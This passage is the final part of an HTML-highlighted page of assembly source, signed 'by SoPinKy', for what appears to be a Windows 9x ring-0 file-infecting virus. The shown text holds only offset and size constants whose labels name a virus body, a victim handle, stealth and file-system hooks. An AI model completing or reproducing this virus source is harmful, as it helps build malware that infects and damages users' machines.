</span><span class="sc5">SIZE_CODE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">FIN_CODE</span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_CODE</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SIZE_DATA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">FIN_DATA</span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SIZE_VIRUS</span><span class="sc4">=(</span><span class="sc5">SIZE_CODE</span><span class="sc4">+</span><span class="sc5">SIZE_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_INT20</span><span class="sc0"> </span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">Nueva_int</span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_VECTTOR_IRQ</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">vector_irq</span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_A_SALTO_A_OLD_IRQ</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">SALTO_A_OLD_IRQ</span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_A_SALTO_A_OLD_IFS</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">SALTO_A_OLD_IFS</span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_FILE_HOOKED</span><span class="sc0"> </span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">FILE_HOOKED</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_Sthealth</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">Stealth</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_NumberPre</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">NumberPre</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_file_EXE</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">file_EXE</span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_SDF_OCUPADO</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">SDF_OCUPADO</span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_DUMMY</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">DUMMY</span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">NiniH</span><span class="sc4">-</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_PEHEAD</span><span class="sc0"> </span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">PEHEAD</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_PEOHEAD</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">PEOHEAD</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">SECTION_DUMMY</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_HANDLE_VICTIMA</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">HANDLE_VICTIMA</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_WinMain2</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">_WinMain2</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_REALEP</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">REALEP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_RING0INSTALER</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">CuerpoDelVirusEnRING0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_SALTOTRUEEP</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">SALTOTRUEEP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_MSG</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">MSG</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_MSGC</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">MSGCAPTION</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_REFDATA</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">REFDATA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OFFSET_ABS_CONTFLAG</span><span class="sc4">=(</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">CONTFLAG</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">BEG_DATA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc9">END</span><span class="sc0">



                                              </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">SoPinKy..</span><span class="sc0"> </span><span class="sc5">Made</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">Argentina.</span><span class="sc0">

</span></div></body>
</html>
